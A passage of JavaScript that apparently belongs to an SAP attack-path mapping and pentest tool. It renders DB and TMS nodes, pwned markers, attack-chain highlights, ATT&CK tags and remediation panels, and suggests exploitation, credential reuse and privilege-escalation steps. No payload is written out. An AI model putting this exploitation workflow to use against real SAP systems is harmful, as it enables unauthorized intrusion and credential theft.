        const _cmx = (_lx + _rx) / 2, _cmy = (_ly + _ry) / 2 - 4;
        html += `<text x="${_cmx}" y="${_cmy}" text-anchor="middle" `
             + `fill="${lineColor}" font-size="8" font-style="italic" `
             + `font-family="monospace" pointer-events="none">is</text>`;
      }

      const dragId = `dbcon:${src.sid}:${e.con_name}`;
      html += `<g class="node-box" data-dbcon="${escHtml(src.sid + '|' + e.con_name)}" `
           + `onmousedown="startDrag(event,'${dragId}')" `
           + `onclick="showDBCONDetail('${escHtml(src.sid)}','${escHtml(e.con_name)}')" `
           + `oncontextmenu="showDBCONCtxMenu(event,'${escHtml(src.sid)}','${escHtml(e.con_name)}')">`;
      // Invisible hit rect covering the FULL cylinder bounding box —
      // SVG only fires clicks where a shape is actually filled, so
      // without this the empty space between text lines and inside
      // the bottom-half ellipse arc (fill=none) is unclickable.
      // fill=transparent (not "none") is required for pointer events.
      html += `<rect x="${x - 1}" y="${yTop - ry - 1}" `
           + `width="${DB_BOX_W + 2}" height="${(yBottom + ry) - (yTop - ry) + 2}" `
           + `fill="transparent" stroke="none" style="cursor:pointer" />`;
      // Body rectangle (between the two ellipses)
      html += `<rect x="${x}" y="${yMid}" width="${DB_BOX_W}" `
           + `height="${yBottomBand - yMid}" fill="${fill}" stroke="none" />`;
      // Top ellipse (full)
      html += `<ellipse cx="${cx}" cy="${yMid}" rx="${rx}" ry="${ry}" `
           + `fill="${fill}" stroke="${stroke}" stroke-width="${strokeW}" />`;
      // Bottom ellipse (front half only — an arc)
      html += `<path d="M${x},${yBottomBand} A${rx},${ry} 0 0 0 ${x + DB_BOX_W},${yBottomBand}" `
           + `fill="none" stroke="${stroke}" stroke-width="${strokeW}" />`;
      // Body side lines
      html += `<line x1="${x}" y1="${yMid}" x2="${x}" y2="${yBottomBand}" stroke="${stroke}" stroke-width="${strokeW}" />`;
      html += `<line x1="${x + DB_BOX_W}" y1="${yMid}" x2="${x + DB_BOX_W}" y2="${yBottomBand}" stroke="${stroke}" stroke-width="${strokeW}" />`;
      // Two horizontal bands inside body (canonical DB icon)
      const bandY1 = yMid + (yBottomBand - yMid) * 0.33;
      const bandY2 = yMid + (yBottomBand - yMid) * 0.66;
      html += `<path d="M${x},${bandY1} A${rx},${ry} 0 0 0 ${x + DB_BOX_W},${bandY1}" fill="none" stroke="${stroke}" stroke-width="1.5" opacity="0.6" />`;
      html += `<path d="M${x},${bandY2} A${rx},${ry} 0 0 0 ${x + DB_BOX_W},${bandY2}" fill="none" stroke="${stroke}" stroke-width="1.5" opacity="0.6" />`;

      // Text — label, dbms, host:port, target sid
      const label = e.con_name || 'DBCON';
      html += `<text x="${cx}" y="${yMid + 8}" text-anchor="middle" `
           + `fill="${labelColor}" font-size="12" font-weight="bold" `
           + `font-family="monospace" pointer-events="none">${escHtml(label.slice(0, 16))}</text>`;
      html += `<text x="${cx}" y="${yMid + 24}" text-anchor="middle" `
           + `fill="#cfd9df" font-size="10" font-family="monospace" `
           + `pointer-events="none">${escHtml(e.dbms || '?')}</text>`;
      html += `<text x="${cx}" y="${yMid + 40}" text-anchor="middle" `
           + `fill="#8b949e" font-size="9" font-family="monospace" `
           + `pointer-events="none">${escHtml((e.host || '?').slice(0, 20))}:${e.port || '?'}</text>`;
      if (e.target_sid) {
        html += `<text x="${cx}" y="${yMid + 54}" text-anchor="middle" `
             + `fill="${labelColor}" font-size="10" font-family="monospace" `
             + `pointer-events="none" font-weight="bold">SID: ${escHtml(e.target_sid)}</text>`;
      }
      // SAP-shape badge — mirrors the "ABAP" pill on S4H nodes so
      // an SAP-shape DB is instantly identifiable at a glance.
      // Top-left of the cylinder, rides just above the top ellipse.
      if (e.is_sap_shape) {
        const _badgeX = x - 6, _badgeY = y - 6;
        const _badgeW = 44, _badgeH = 18;
        html += `<rect x="${_badgeX}" y="${_badgeY}" width="${_badgeW}" `
             + `height="${_badgeH}" rx="9" fill="#1f6feb" `
             + `stroke="#58a6ff" stroke-width="1.5" `
             + `pointer-events="none" />`;
        html += `<text x="${_badgeX + _badgeW / 2}" `
             + `y="${_badgeY + _badgeH / 2 + 4}" text-anchor="middle" `
             + `fill="#ffffff" font-size="11" font-weight="bold" `
             + `font-family="Arial,sans-serif" `
             + `pointer-events="none">SAP</text>`;
      }
      // Lightning bolt on pwn
      if (e.pwned) {
        html += `<text x="${x + DB_BOX_W - 10}" y="${y + 18}" font-size="26" `
             + `fill="#f0883e" stroke="#0d1117" stroke-width="2.5" paint-order="stroke" `
             + `text-anchor="middle" dominant-baseline="middle" font-weight="bold" `
             + `pointer-events="none">&#9889;</text>`;
      }
      html += '</g>';
    });
  });

  // ===================================================================
  // TMS destinations — teal cylinders (CTS/TMS epic Bundle 1).
  // Same shape/pattern as DBCON — sits below the DBCON stack.
  // Distinct teal palette + CTRL badge on the domain controller.
  // ===================================================================
  const TMS_BOX_W = 160, TMS_BOX_H = 100;
  Object.values(nodes).forEach(src => {
    const dests = src.tms_destinations || [];
    if (!dests.length) return;
    // Stack TMS trucks vertically BELOW the source, in a column
    // RIGHT of the DBCON column.  Prior versions placed TMS to the
    // LEFT of source, but on hosts with a neighbouring SAP node
    // to the left (typical row-layout) the truck would collide
    // with that neighbour and the walk-down cascade would drop it
    // into no-man's-land between zones.  Below-source + offset
    // right (past the DBCON column at srcX..srcX+DB_W) keeps both
    // accessory families inside the source's host zone by default.
    const srcX = src._x || 0, srcY = src._y || 0;
    const baseX = srcX + 150 + 20;    // right of DBCON column
    const stackY = srcY + 174 + 20;   // BOX_H (174) + gap
    dests.forEach((e, i) => {
      const posKey = 'tms:' + src.sid + '|' + e.target_sid + '|' + e.domain;
      // Same auto-reposition-on-collision logic as DBCON.  Fixes the
      // "TMS truck ends up on top of a newly-scanned SAP node" case
      // reported after a fresh scan discovered new hosts.  `pinned:
      // true` set by the drag handler protects manual placements.
      const _rectOverlap = (ax, ay, aw, ah, bx, by, bw, bh) =>
        ax < bx + bw && ax + aw > bx && ay < by + bh && ay + ah > by;
      const _collides = (tx, ty) => {
        const tw = TMS_BOX_W, th = TMS_BOX_H;
        for (const nk in nodes) {
          const n = nodes[nk];
          if (n === src) continue;
          if (n._x == null) continue;
          if (_rectOverlap(tx, ty, tw, th, n._x, n._y, 240, 174)) return true;
        }
        for (const sk in sccNodes) {
          const sn = sccNodes[sk];
          if (sn._x == null) continue;
          if (_rectOverlap(tx, ty, tw, th, sn._x, sn._y, 240, 174)) return true;
        }
        for (const bk in btpNodes) {
          const bn = btpNodes[bk];
          if (bn._x == null) continue;
          if (_rectOverlap(tx, ty, tw, th, bn._x, bn._y, 240, 174)) return true;
        }
        for (const pk in dbconPositions) {
          const p = dbconPositions[pk];
          if (_rectOverlap(tx, ty, tw, th, p._x, p._y, 150, 100)) return true;
        }
        for (const pk in tmsPositions) {
          if (pk === posKey) continue;
          const p = tmsPositions[pk];
          if (_rectOverlap(tx, ty, tw, th, p._x, p._y, TMS_BOX_W, TMS_BOX_H)) return true;
        }
        return false;
      };
      const _existing = tmsPositions[posKey];
      const _needsRewalk = _existing && !_existing.pinned &&
                             _collides(_existing._x, _existing._y);
      if (_existing && !_needsRewalk) {
        e._x = _existing._x;
        e._y = _existing._y;
      } else {
        if (_needsRewalk) {
          console.log('TMS auto-reposition: ' + posKey +
                       ' overlapped a newly-scanned node, re-walking');
        }
        let cx = baseX, cy = stackY + i * (TMS_BOX_H + 24);
        let _guard = 0;
        while (_collides(cx, cy) && _guard < 40) {
          cy += TMS_BOX_H + 24;
          // Wraparound goes RIGHT (matches new below-source stacking
          // direction).  Old code wrapped LEFT because trucks used
          // to stack left-of-source; now they stack right-of-DBCON
          // below source, so LEFT would push them into the DBCON
          // column.
          if (cy - (srcY || 0) > 600) { cx += TMS_BOX_W + 60; cy = stackY; }
          _guard++;
        }
        e._x = cx; e._y = cy;
        tmsPositions[posKey] = { _x: e._x, _y: e._y };
      }
      const x = e._x, y = e._y;

      // Teal palette for TMS — distinct from green DBCON, orange
      // pwned, yellow non-SAP-shape.  Same fill/stroke/labelColor
      // rules the cylinder used; the shape changed from cylinder to
      // truck (SAP's own STMS UI uses a truck icon for transport
      // destinations, so the DB-cylinder shape was misleading —
      // it reads as "database", not "transport route").
      let fill = "#1c2128";
      let stroke = "#8b949e";
      let strokeW = 2;
      let labelColor = "#8b949e";
      if (e.logon_ok) {
        fill = "#0f2831";
        stroke = e.pwned ? "#f0883e" : (e.is_controller ? "#39d1c4" : "#2e9d9d");
        strokeW = e.is_controller ? 5 : 4;
        labelColor = e.pwned ? "#f0883e" :
                       (e.is_controller ? "#39d1c4" : "#2e9d9d");
      } else if (e.tested) {
        fill = "#2d1c1c"; stroke = "#f85149"; strokeW = 3;
        labelColor = "#f85149";
      }

      let lineColor, lineDash;
      if (e.logon_ok) {
        lineColor = e.pwned ? '#f0883e' :
                     (e.is_controller ? '#39d1c4' : '#2e9d9d');
        lineDash = '';
      } else if (e.tested) { lineColor = '#f85149'; lineDash = '5,4'; }
      else { lineColor = '#8b949e'; lineDash = '5,4'; }
      // Line origin/target: source's BOTTOM to truck's TOP now that
      // TMS stacks below source (right of the DBCON column) instead
      // of to the left.  Keeps the connector visually short + inside
      // the host zone.
      const _sx = srcX + 120;              // roughly middle of source
      const _sy = srcY + 174;              // bottom edge of source (BOX_H)
      const _tx = x + TMS_BOX_W / 2;
      const _ty = y;                       // top edge of truck
      const dashAttr = lineDash ? ` stroke-dasharray="${lineDash}"` : '';
      html += `<line x1="${_sx}" y1="${_sy}" x2="${_tx}" y2="${_ty}" `
           + `stroke="${lineColor}" stroke-width="2"${dashAttr} `
           + `pointer-events="none" opacity="0.85" />`;
      const _mx = (_sx + _tx) / 2, _my = (_sy + _ty) / 2 - 4;
      const _lineLbl = `TMSADM / ${e.domain || '?'}`;
      html += `<text x="${_mx}" y="${_my}" text-anchor="middle" `
           + `fill="${lineColor}" font-size="9" font-family="monospace" `
           + `pointer-events="none">${escHtml(_lineLbl)}</text>`;

      const dragId = 'tms:' + src.sid + ':' + e.target_sid + ':' + e.domain;
      html += `<g class="node-box" data-tms="${escHtml(dragId)}" `
           + `onmousedown="startDrag(event,'${dragId}')" `
           + `onclick="showTMSDetail('${escHtml(src.sid)}','${escHtml(e.target_sid)}','${escHtml(e.domain)}')" `
           + `oncontextmenu="showTMSCtxMenu(event,'${escHtml(src.sid)}','${escHtml(e.target_sid)}','${escHtml(e.domain)}')">`;

      // Truck silhouette — cargo box + cab + 2 wheels.  All shapes
      // share the same fill/stroke as the old cylinder so the
      // logon/pwned/controller states remain visually consistent
      // with the rest of the map.
      //
      // Coordinate layout inside the 160×100 bounding box:
      //   Cargo box:  (x+2, y+16) → (x+108, y+72)   106w × 56h
      //   Cab body:   (x+108, y+32) → (x+150, y+72)  42w × 40h
      //   Windshield: (x+114, y+38) → (x+146, y+54)  32w × 16h
      //   Rear wheel: cx=x+28, cy=y+78, r=8
      //   Front wheel: cx=x+134, cy=y+78, r=8
      // Text stacks inside the cargo box between y+30 and y+66.
      const CARGO_X = x + 2, CARGO_Y = y + 16;
      const CARGO_W = 106, CARGO_H = 56;
      const CAB_X   = x + 108, CAB_Y = y + 32;
      const CAB_W   = 42, CAB_H = 40;
      // Full-box hit rect so drag/click still work anywhere over the
      // truck silhouette + wheels + CTRL badge overhang.
      html += `<rect x="${x - 6}" y="${y - 6}" `
           + `width="${TMS_BOX_W + 12}" height="${TMS_BOX_H + 12}" `
           + `fill="transparent" stroke="none" style="cursor:pointer" />`;
      // Cargo box body
      html += `<rect x="${CARGO_X}" y="${CARGO_Y}" width="${CARGO_W}" `
           + `height="${CARGO_H}" rx="3" fill="${fill}" stroke="${stroke}" `
           + `stroke-width="${strokeW}" />`;
      // Cargo box door lines (2 vertical bands, mimics the cylinder's
      // horizontal bands — decorative, keeps a sense of "container")
      const doorX1 = CARGO_X + CARGO_W * 0.35;
      const doorX2 = CARGO_X + CARGO_W * 0.68;
      html += `<line x1="${doorX1}" y1="${CARGO_Y + 4}" x2="${doorX1}" `
           + `y2="${CARGO_Y + CARGO_H - 4}" stroke="${stroke}" `
           + `stroke-width="1" opacity="0.5" />`;
      html += `<line x1="${doorX2}" y1="${CARGO_Y + 4}" x2="${doorX2}" `
           + `y2="${CARGO_Y + CARGO_H - 4}" stroke="${stroke}" `
           + `stroke-width="1" opacity="0.5" />`;
      // Cab body (rectangle) with slanted top-right hood cut — draws
      // as a 5-point path: bottom-left, top-left, top-right-of-flat,
      // slanted down to a mid-height corner, then down to bottom-right.
      html += `<path d="M${CAB_X},${CAB_Y + CAB_H} `
           + `L${CAB_X},${CAB_Y} `
           + `L${CAB_X + CAB_W - 10},${CAB_Y} `
           + `L${CAB_X + CAB_W},${CAB_Y + 14} `
           + `L${CAB_X + CAB_W},${CAB_Y + CAB_H} Z" `
           + `fill="${fill}" stroke="${stroke}" stroke-width="${strokeW}" />`;
      // Windshield — small light rect on the cab
      const winX = CAB_X + 4, winY = CAB_Y + 4;
      const winW = CAB_W - 16, winH = 12;
      html += `<path d="M${winX},${winY + winH} `
           + `L${winX},${winY} `
           + `L${winX + winW - 4},${winY} `
           + `L${winX + winW + 2},${winY + winH} Z" `
           + `fill="${labelColor}" opacity="0.35" stroke="${stroke}" `
           + `stroke-width="1" />`;
      // 2 wheels — hub outer + inner dark centre for depth
      const wheelR = 9, wheelHubR = 3;
      const wheelY = CARGO_Y + CARGO_H + 6;
      const wheelRearX = CARGO_X + 26;
      const wheelFrontX = CAB_X + CAB_W - 8;
      [wheelRearX, wheelFrontX].forEach(wx => {
        html += `<circle cx="${wx}" cy="${wheelY}" r="${wheelR}" `
             + `fill="#0d1117" stroke="${stroke}" stroke-width="${strokeW}" />`;
        html += `<circle cx="${wx}" cy="${wheelY}" r="${wheelHubR}" `
             + `fill="${stroke}" opacity="0.8" />`;
      });

      // Text — target SID, domain, host — inside the cargo box
      const textCX = CARGO_X + CARGO_W / 2;
      html += `<text x="${textCX}" y="${CARGO_Y + 16}" text-anchor="middle" `
           + `fill="${labelColor}" font-size="11" font-weight="bold" `
           + `font-family="monospace" pointer-events="none">TMSADM@${escHtml(e.target_sid || '?')}</text>`;
      html += `<text x="${textCX}" y="${CARGO_Y + 30}" text-anchor="middle" `
           + `fill="#cfd9df" font-size="9" font-family="monospace" `
           + `pointer-events="none">dom ${escHtml((e.domain || '?').slice(0, 12))}</text>`;
      html += `<text x="${textCX}" y="${CARGO_Y + 43}" text-anchor="middle" `
           + `fill="#8b949e" font-size="8" font-family="monospace" `
           + `pointer-events="none">${escHtml((e.target_host || '?').slice(0, 18))}</text>`;
      if (e.buffer_count) {
        // Buffer count sits BELOW the wheels so it's always visible
        // and doesn't overlap the truck body.
        html += `<text x="${textCX}" y="${y + TMS_BOX_H - 4}" text-anchor="middle" `
             + `fill="${labelColor}" font-size="10" font-family="monospace" `
             + `pointer-events="none" font-weight="bold">${e.buffer_count} pending</text>`;
      }
      // CTRL badge — top-left, teal pill (mirrors SAP badge on DBCON)
      if (e.is_controller) {
        const bx = x - 6, by = y - 6, bw = 48, bh = 18;
        html += `<rect x="${bx}" y="${by}" width="${bw}" height="${bh}" `
             + `rx="9" fill="#0e7c76" stroke="#39d1c4" stroke-width="1.5" `
             + `pointer-events="none" />`;
        html += `<text x="${bx + bw / 2}" y="${by + bh / 2 + 4}" `
             + `text-anchor="middle" fill="#ffffff" font-size="11" `
             + `font-weight="bold" font-family="Arial,sans-serif" `
             + `pointer-events="none">CTRL</text>`;
      }
      if (e.pwned) {
        html += `<text x="${x + TMS_BOX_W - 10}" y="${y + 18}" font-size="26" `
             + `fill="#f0883e" stroke="#0d1117" stroke-width="2.5" paint-order="stroke" `
             + `text-anchor="middle" dominant-baseline="middle" font-weight="bold" `
             + `pointer-events="none">&#9889;</text>`;
      }
      html += '</g>';
    });
  });

  // Draw unknown target boxes (dashed border, dimmed)
  if (showUnknown) {
    for (const key in unknownTargets) {
      const ut = unknownTargets[key];
      const x = ut._x || 0, y = ut._y || 0;
      const unkId = 'unk:' + key.replace(/'/g, "\\'");
      html += `<g class="node-box" onmousedown="startDrag(event,'${unkId}')">`;
      html += `<rect x="${x}" y="${y}" width="${BOX_W}" height="${BOX_H}" rx="6" fill="#1a1a2e" stroke="#484f58" stroke-width="3" stroke-dasharray="8,4" />`;
      html += `<rect x="${x}" y="${y}" width="${BOX_W}" height="28" rx="6" fill="#484f58" opacity="0.2" />`;
      html += `<text x="${x+BOX_W/2}" y="${y+18}" fill="#484f58" font-size="11" font-weight="bold" font-family="monospace" text-anchor="middle">UNKNOWN TARGET</text>`;
      html += `<text x="${x+10}" y="${y+48}" fill="#6e7681" font-size="10" font-family="monospace">Host: ${escHtml(ut.label)}</text>`;
      html += `<text x="${x+BOX_W/2}" y="${y+BOX_H/2+10}" fill="#484f58" font-size="20" text-anchor="middle">?</text>`;
      html += '</g>';
    }
  }

  // Chain highlight overlay: draw glowing path + hop badges
  if (_highlightedChain && _highlightedChain.length >= 2) {
    const BOX_W_h = 240, BOX_H_h = 174;
    // Resolve chain SIDs against on-prem nodes AND BTP subaccounts.
    // BTP-rooted chains start with a "BTP:<uuid8>" sentinel that
    // doesn't exist in mapState.nodes — without this branch the
    // highlight loop bailed silently and "Click to highlight on
    // map" looked broken.
    const _resolveChainSid = (sid) => {
      if (!sid) return null;
      if (nodes[sid]) return nodes[sid];
      if (sid.startsWith('BTP:')) {
        const suffix = sid.slice(4).toLowerCase();
        for (const u in btpNodes) {
          if (u.toLowerCase().startsWith(suffix)) return btpNodes[u];
        }
      }
      return null;
    };
    // Draw glowing edges between consecutive nodes in the chain
    for (let i = 0; i < _highlightedChain.length - 1; i++) {
      const srcSid = _highlightedChain[i];
      const tgtSid = _highlightedChain[i + 1];
      const srcN = _resolveChainSid(srcSid);
      const tgtN = _resolveChainSid(tgtSid);
      if (!srcN || !tgtN) continue;
      const sx = (srcN._x||0) + BOX_W_h/2, sy = (srcN._y||0) + BOX_H_h/2;
      const tx = (tgtN._x||0) + BOX_W_h/2, ty = (tgtN._y||0) + BOX_H_h/2;
      // Glow underlay
      html += `<line x1="${sx}" y1="${sy}" x2="${tx}" y2="${ty}" stroke="#e74c3c" stroke-width="12" opacity="0.25" stroke-linecap="round">` +
        `<animate attributeName="opacity" values="0.15;0.35;0.15" dur="2s" repeatCount="indefinite" /></line>`;
      // Main line
      html += `<line x1="${sx}" y1="${sy}" x2="${tx}" y2="${ty}" stroke="#e74c3c" stroke-width="4" stroke-linecap="round">` +
        `<animate attributeName="stroke" values="#e74c3c;#ff6b6b;#e74c3c" dur="1.5s" repeatCount="indefinite" /></line>`;
      // Arrow head at midpoint
      const mx = (sx+tx)/2, my = (sy+ty)/2;
      html += `<text x="${mx}" y="${my-8}" text-anchor="middle" font-size="16" fill="#e74c3c" opacity="0.8">&#9654;</text>`;
    }
    // Hop number badges on each node in the chain
    for (let i = 0; i < _highlightedChain.length; i++) {
      const nSid = _highlightedChain[i];
      const nNode = _resolveChainSid(nSid);
      if (!nNode) continue;
      const bx = (nNode._x||0) + BOX_W_h - 8, by = (nNode._y||0) - 8;
      const isStart = (i === 0), isEnd = (i === _highlightedChain.length - 1);
      const badgeCol = isStart ? '#f0883e' : isEnd ? '#e74c3c' : '#d29922';
      const label = isStart ? '&#9733;' : isEnd ? '&#127919;' : String(i);
      html += `<circle cx="${bx}" cy="${by}" r="14" fill="${badgeCol}" stroke="#0d1117" stroke-width="2">` +
        `<animate attributeName="r" values="14;16;14" dur="1.5s" repeatCount="indefinite" /></circle>`;
      html += `<text x="${bx}" y="${by+5}" text-anchor="middle" font-size="12" fill="#fff" font-weight="bold">${label}</text>`;
    }
  }

  svg.innerHTML = html;

  // Keep the pulse overlay's viewBox matched so pulse rects/lines land
  // on the same world coordinates as the main map.
  const pulseSvg = document.getElementById('pulse-svg');
  if (pulseSvg) {
    pulseSvg.setAttribute('viewBox',
      svg.getAttribute('viewBox') || `0 0 ${viewBox.w} ${viewBox.h}`);
  }

  // Post-render: animate new connection lines (draw effect)
  svg.querySelectorAll('.edge-line[data-new="1"]').forEach(el => {
    const len = el.getTotalLength ? el.getTotalLength() : 500;
    el.style.strokeDasharray = len;
    el.style.strokeDashoffset = len;
    el.style.transition = 'stroke-dashoffset 0.8s ease-out';
    el.getBoundingClientRect(); // force reflow
    el.style.strokeDashoffset = '0';
    el.addEventListener('transitionend', () => {
      const origDash = el.getAttribute('data-orig-dash') || '';
      el.style.strokeDasharray = origDash || '';
      el.style.strokeDashoffset = '';
      el.style.transition = '';
    }, { once: true });
  });

  // Update tracking sets
  knownNodeSids = new Set(nodeKeys);
  knownConnKeys = newConnKeys;
  if (firstRender) {
    firstRender = false;
    // Default view: Hierarchy.  When nodes appear for the first
    // time in this session, apply the layered top-down RFC-flow
    // layout so trust direction reads at a glance (sources of
    // edges on upper layers, targets below).  Deferred one tick
    // (setTimeout 0) so the current updateMap completes before
    // layoutHierarchy triggers its own re-render.  Skipped when
    // there are no nodes yet (waiting on a scan).
    if (nodeKeys.length > 0 || _sccCount > 0) {
      setTimeout(() => {
        try { layoutHierarchy(); } catch (_) {}
      }, 0);
    }
  }

  // Schedule fast re-renders while nodes are still fading in
  if (Object.keys(fadingNodes).length > 0) {
    setTimeout(updateMap, 80);
  }

  // Re-apply ATT&CK highlight overlays that the SVG rewrite just wiped.
  // Without this, every state poll (1-2 Hz during a scan) destroys the
  // pulsing overlay we attached in filterMapToSids(), shortening the
  // visible effect to ~0.5s.
  try { _reapplyAttackHighlights(); } catch (_) {}
}

// --- Event handlers ---
function downloadCsv(sid, scenario) {
  // Use the query-string route so scenario names containing "/"
  // (e.g. "PI/PO Message Tampering") survive HTTP routing — Bottle's
  // <name> placeholder doesn't match a literal slash, even when the
  // browser %2F-encodes it.
  const url = '/api/node/' + encodeURIComponent(sid) +
              '/impact/export?scenario=' + encodeURIComponent(scenario);
  fetch(url)
    .then(r => r.text().then(text => ({ ok: r.ok, status: r.status, text })))
    .then(({ ok, status, text }) => {
      let data = null;
      try { data = JSON.parse(text); } catch (e) { /* non-JSON body */ }
      if (data && data.status === 'ok') {
        alert('Exported ' + data.records + ' records to:\n' + data.file);
      } else if (data && data.error) {
        alert('Export failed: ' + data.error);
      } else {
        alert('Export failed: HTTP ' + status + (text ? '\n' + text.slice(0, 200) : ''));
      }
    })
    .catch(err => alert('Export error: ' + err));
}

function escHtml(s) {
  if (!s) return '';
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// MITRE ATT&CK rendering helpers — pills next to findings, full section
// in the node detail panel, and cell legends in the heatmap modal.
// mapState.attack_catalog is populated by /api/attack/catalog (called
// once at boot) and looks like {techniques: {T1190: {name, tactic,
// tactic_name, url}, ...}, tactics: {TA0001: "Initial Access", ...},
// tactic_order: [...]}.
function _attackInfo(tid) {
  const cat = (window.mapState && mapState.attack_catalog) || {};
  return (cat.techniques || {})[tid] || null;
}
function renderAttackPills(tids, opts) {
  if (!tids || !tids.length) return '';
  const maxVisible = (opts && opts.max) || 3;
  const visible = tids.slice(0, maxVisible);
  const extra = tids.length - visible.length;
  const pills = visible.map(tid => {
    const info = _attackInfo(tid);
    const name = info ? info.name : '';
    const url = info ? info.url : `https://attack.mitre.org/techniques/${tid.replace('.','/')}/`;
    const tt = name ? `${tid} — ${name}` : tid;
    return `<a href="${escHtml(url)}" target="_blank" rel="noopener noreferrer" class="attack-pill" title="${escHtml(tt)}">${escHtml(tid)}</a>`;
  }).join('');
  const more = extra > 0
    ? `<span class="attack-pill attack-pill-more" title="${escHtml(tids.slice(maxVisible).join(', '))}">+${extra}</span>`
    : '';
  return `<span class="attack-pills">${pills}${more}</span>`;
}

// Render a remediation block — accepts either a legacy plain string
// (old emit_finding callsites) or a structured dict matching
// sapmap_remediation.Remediation.to_dict().  Returns empty string when
// there is nothing to show.
function renderRemediationBlock(rem) {
  if (!rem) return '';
  // Legacy plain string — keep the old one-line green check.
  if (typeof rem === 'string') {
    return `<br><span style="color:#3fb950;font-size:10px">&#10004; ${escHtml(rem)}</span>`;
  }
  if (typeof rem !== 'object' || !rem.fix_summary) return '';
  // Structured: summary + steps + verification + refs + badges
  const steps = (rem.fix_steps || []).map(s =>
    `<li>${escHtml(s)}</li>`).join('');
  const verify = (rem.verification || []).map(s =>
    `<li>${escHtml(s)}</li>`).join('');
  const refs = (rem.refs || []).map(r => {
    const label = Array.isArray(r) ? r[0] : '';
    const url   = Array.isArray(r) ? r[1] : '';
    if (!label || !url) return '';
    return `<a href="${escHtml(url)}" target="_blank" rel="noopener noreferrer" class="attack-pill" style="text-decoration:none">${escHtml(label)}</a>`;
  }).join('');
  const restartBadge = rem.requires_restart
    ? '<span class="rem-badge" style="background:#3a1f00;color:#d29922;border-color:#5a3000" title="Applying this fix needs an instance restart / downtime">restart needed</span>'
    : '<span class="rem-badge" style="background:#0d2e1c;color:#3fb950;border-color:#1a4f33" title="No downtime required">online fix</span>';
  const effortBadge = (rem.effort_minutes && rem.effort_minutes > 0)
    ? `<span class="rem-badge" title="Rough wall-clock effort estimate (one engineer)">~${rem.effort_minutes} min</span>`
    : '';
  const severityIfDelayed = rem.severity_if_delayed
    ? `<span class="rem-badge" style="background:#3a0f10;color:#ff6b6b;border-color:#8b0000" title="Severity of the EXISTING finding if the fix is delayed">if delayed: ${escHtml(rem.severity_if_delayed)}</span>`
    : '';
  const hasDetail = steps || verify || refs;
  const detailId = 'rem-' + Math.random().toString(36).slice(2, 9);
  return `
    <div class="rem-block" style="margin-top:8px;padding:8px 10px;background:#0d1f12;border:1px solid #1a4f33;border-radius:4px;color:#cfd9df;font-size:11px;line-height:1.45">
      <div style="color:#3fb950;font-weight:600;margin-bottom:4px;${hasDetail ? 'cursor:pointer' : ''}" ${hasDetail ? `onclick="var d=document.getElementById('${detailId}');var a=this.querySelector('.rem-arrow');if(d.style.display==='none'){d.style.display='block';a.textContent='\\u25BC'}else{d.style.display='none';a.textContent='\\u25B6'}"` : ''}>&#10004; Hardening: ${escHtml(rem.fix_summary)}${hasDetail ? ' <span class="rem-arrow" style="font-size:9px;color:#8b949e">&#9654;</span>' : ''}</div>
      <div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:2px">${restartBadge}${effortBadge}${severityIfDelayed}</div>
      ${hasDetail ? `<div id="${detailId}" style="display:none">` : ''}
      ${steps ? `<div style="margin-top:6px"><b style="color:#8b949e">Fix steps:</b><ol style="margin:4px 0 4px 18px;padding:0">${steps}</ol></div>` : ''}
      ${verify ? `<div style="margin-top:6px"><b style="color:#8b949e">Verification:</b><ol style="margin:4px 0 4px 18px;padding:0">${verify}</ol></div>` : ''}
      ${refs ? `<div style="margin-top:6px"><b style="color:#8b949e">References:</b><div style="display:flex;gap:4px;flex-wrap:wrap;margin-top:3px">${refs}</div></div>` : ''}
      ${hasDetail ? '</div>' : ''}
    </div>`;
}

function getSuggestedActions(n, sid) {
  if (!n) return [];
  const suggestions = [];
  const sysType = ((n.system_type || '') + '').toUpperCase();
  const isAbap = sysType.indexOf('ABAP') !== -1;
  const isJava = sysType.indexOf('JAVA') !== -1;
  const isWin = (n.os_type || '').toLowerCase().includes('windows');
  const hasGwPort = (n.instances || []).some(i => Object.entries(i.ports || {}).some(([p,s]) => s === 'gateway' || (p >= 3300 && p <= 3399)));
  const hasGw = !!n.gw_vulnerable;
  const hasMs = !!n.ms_vulnerable;
  const hasCve31324 = !!n.cve_2025_31324_vulnerable;
  const hasCve6287 = !!n.cve_2020_6287_vulnerable;
  const pwned = !!n.pwned;
  const creds = n.credentials || [];
  const created = n.created_users || [];
  const hasCreds = creds.length > 0 || created.length > 0;
  const hasVerified = creds.some(c => c && c.verified);
  const hasUsableAbap = isAbap && (hasVerified || created.length > 0);
  const hasRFCs = (mapState.connections || []).some(c => c.source_sid === sid);
  const hasUntested = (mapState.connections || []).some(c => c.source_sid === sid && !c.tested);
  // Lateral-movement viability: a destination is "reachable" from this
  // node if we have proven working creds against the target OR we hold
  // usable creds we haven't tried yet.  Includes:
  //   * classic RFC destinations that logon_successful=true
  //   * TCP/IP (Type-T) destinations that sapxpg_remote_works=true
  //   * Java-sourced HTTP destinations with a decrypted secstore_password
  //     (propagate_from_node takes the direct-target-login shortcut when
  //     given the destination name — no source access needed on the target).
  // The target must exist on the map and not already be pwned.
  const hasTestedReachable = (mapState.connections || []).some(c => {
    if (c.source_sid !== sid || !c.target_sid) return false;
    const tgt = (mapState.nodes || {})[c.target_sid];
    if (!tgt || tgt.pwned) return false;
    return (c.tested && (c.logon_successful || c.sapxpg_remote_works))
        || !!c.secstore_password;
  });
  const linuxLpeViable = !isWin && (n.copyfail_vulnerable || n.dirtyfrag_vulnerable || n.peditcow_vulnerable);
  const winLpeViable = isWin && (n.miniplasma_vulnerable || n.godpotato_vulnerable || n.efspotato_vulnerable);
  const hasOsExec = hasGw || hasCve31324 || created.length > 0;

  // Phase 1: Discovery — has system info but no vuln checks done
  const stackKnown = isAbap || isJava;
  const anyVulnChecked = !!(n.cve_2025_31324_checked || n.cve_2020_6287_checked
                            || n.cve_2022_22536_checked || n.gw_vulnerable
                            || n.ms_vulnerable || n.ms_acl_protected);
  if (!stackKnown && (n.hostname || n.ip)) {
    suggestions.push({icon: '🔍', label: 'Standard Scan (fingerprint)', action: 'standard_scan'});
  } else if (stackKnown && !anyVulnChecked) {
    suggestions.push({icon: '🔍', label: 'Check Vulnerabilities (all)', action: 'check_node_vulns'});
  }

  // Phase 2: Exploitation
  // ABAP-only nodes: GW exploit creates an ABAP user directly (pwns).
  // Java stacks need a Java UME user for real pwn — so on Java/dual
  // stacks with GW/CVE-31324/CVE-6287 we suggest Create User (Java UME).
